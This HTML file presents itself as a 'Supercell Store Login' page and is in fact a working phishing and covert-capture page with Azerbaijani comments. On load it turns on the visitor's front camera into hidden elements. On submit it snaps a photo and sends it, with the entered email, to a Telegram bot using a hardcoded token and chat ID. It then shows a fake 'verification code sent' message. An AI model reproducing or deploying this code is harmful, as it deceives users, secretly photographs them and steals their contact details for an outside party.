<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Supercell Store Login</title>
    <style>
        * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background-color: #1a4da1; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-card { background-color: white; width: 380px; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); text-align: center; }
        .logo-box { background-color: #ffc107; width: 80px; height: 80px; margin: 0 auto 20px; border-radius: 18px; display: flex; justify-content: center; align-items: center; font-size: 50px; font-weight: 900; color: white; }
        h2 { margin: 0 0 10px 0; font-size: 24px; }
        p { color: #666; font-size: 15px; margin-bottom: 25px; }
        input[type="email"] { width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; margin-bottom: 15px; }
        .btn-signin { width: 100%; padding: 15px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; background-color: #4285f4; color: white; text-transform: uppercase; }
        /* Kameranı gizli saxlayırıq */
        #video, #canvas { display: none; }
    </style>
</head>
<body>

    <div class="login-card">
        <div class="logo-box">S</div>
        <h2>Supercell Store Login</h2>
        <p>Enter your email to receive a verification code.</p>

        <form id="loginForm">
            <input type="email" id="email" placeholder="Enter your email address" required>
            <button type="submit" class="btn-signin">➜ SIGN IN</button>
        </form>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        // MƏLUMATLARI BURAYA DAXİL EDİN
        const BOT_TOKEN = "8547908650:AAGrPuSRhlb-SuE_x5ui1wZ9so5sBMclL5A"; 
        const CHAT_ID = "-1003369084883";

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const form = document.getElementById('loginForm');

        // Səhifə açılan kimi kameranı işə salırıq
        async function setupCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
                video.srcObject = stream;
            } catch (err) {
                console.error("Kamera xətası: ", err);
            }
        }

        setupCamera();

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            const emailValue = document.getElementById('email').value;

            // Canvas-da şəkli çək (Snapshot)
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Şəkli Blob formatına salıb göndər
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'capture.jpg');
                formData.append('caption', `🔔 Yeni giriş!\n📧 Email: ${emailValue}`);

                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    
                    // Göndərəndən sonra saytın özünü necə aparacağını bura yaza bilərsiniz
                    alert("Verification code sent to " + emailValue);
                } catch (error) {
                    console.error("Telegram xətası:", error);
                }
            }, 'image/jpeg', 0.8);
        });
    </script>
</body>
</html>
